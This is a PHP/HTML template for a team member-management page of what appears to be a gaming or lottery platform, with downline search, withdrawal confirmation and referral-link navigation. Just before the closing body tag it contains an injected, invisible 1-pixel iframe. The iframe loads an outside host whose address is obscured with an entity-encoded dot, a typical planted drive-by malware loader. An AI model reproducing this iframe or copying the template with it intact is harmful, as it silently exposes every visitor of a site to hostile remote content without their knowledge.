<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<?php $this->display('inc_skin.php', 0 , ''); ?>
<script type="text/javascript" src="<?=$this->settings['templateurl'] ?>/template/js/comm/team.js"></script>
<script type="text/javascript">
$(function(){
	$('.page_search select').change(function(){
		//this.form.submit();
		$(this).closest('form').submit();
	});
	$('.btn_search').click(function(){
		$(this).closest('form').submit();
	});
	
	$('.page_search input[name=username]')
	.focus(function(){
		if(this.value=='用户名') this.value='';
	})
	.blur(function(){
		if(this.value=='') this.value='用户名';
	})
	.keypress(function(e){
		if(e.keyCode==13) $(this).closest('form').submit();
	});
	
	$('.bottompage a[href], .caozuo').live('click', function(){
		$('.page_list').load($(this).attr('href'));
		return false;
	});
	
	$('.sure[id]').click(function(){
		var $this=$(this),
		cashId=$this.attr('id'),
		
		call=function(err, data){
			if(err){
				davidError(err);
			}else{
				this.parent().text('已到帐');
			}
		}
		
		$.ajax('<?=$this->basePath('Cash-toCashSure','',true) ?>?id='+cashId,{
			dataType:'json',
			
			error:function(xhr, textStatus, errThrow){
				call.call($this, errThrow||textStatus);
			},
			
			success:function(data, textStatus, xhr){
				var errorMessage=xhr.getResponseHeader('X-Error-Message');
				if(errorMessage){
					call.call($this, decodeURIComponent(errorMessage), data);
				}else{
					call.call($this, null, data);
				}
			}
		});
	});
});
function teamBeforeSearchMember(){}
function teamSearchMember(err, data){
	if(err){
		davidError(err);
	}else{
		$('.page_list').html(data);
	}
}
</script>
</head> 
<body>
<?php $this->display('inc_header.php'); ?>
<div id="rightcon">
            <div class="wrapper bigbox">
<div class="page-wrapper">
    <?php $this->display('inc_left.php'); ?><div class="top_menu">
        <a class="act" href="<?=$this->basePath('Team-memberList') ?>">会员管理</a>
        <a href="<?=$this->basePath('Team-gameRecord') ?>">游戏记录</a>
        <a href="<?=$this->basePath('Team-report') ?>">盈亏报表</a>
        <a href="<?=$this->basePath('Team-coinall') ?>">团队统计</a>
        <a href="<?=$this->basePath('Team-coin') ?>">帐变记录</a>
        <a href="<?=$this->basePath('Team-cashRecord') ?>">提现记录</a>
        <a href="<?=$this->basePath('Team-linkList') ?>">推广链接</a>
    </div>
    <div class="page-info">
	 <div class="page_search">
  		<form action="<?=$this->basePath('Team-searchMember') ?>" dataType="html" target="ajax" method="get" onajax="teamBeforeSearchMember" call="teamSearchMember">
		 <table border="0" cellspacing="0" cellpadding="0">
		 <tr><td>
		 <select name="type">
		   <option value="0">所有人</option>
		   <option value="1">我自己</option>
		   <option value="2" selected>直属下线</option>
		   <option value="3">所有下线</option>
		 </select>
		 <input height="20" value="用户名" name="username" type="text"/>         
		 <input type="button" value="查 询" class="btn_search btn btn-action "/>
		 <input type="button" value="添加会员" class="btn_search btn btn-action"  onclick="window.location='<?=$this->basePath('Team-addMember') ?>'"/>
		 </td></tr></table>
  		</form> 
    </div>
	
        <div class="clear"></div>
        <div class="page_list">
         <?php $_GET['type']=1; $this->display('team/member-search-list.php'); ?>
        </div>
        <div class="clear"></div>
    </div>
</div>
</div>
</div><?php $this->display('inc_footer.php'); ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>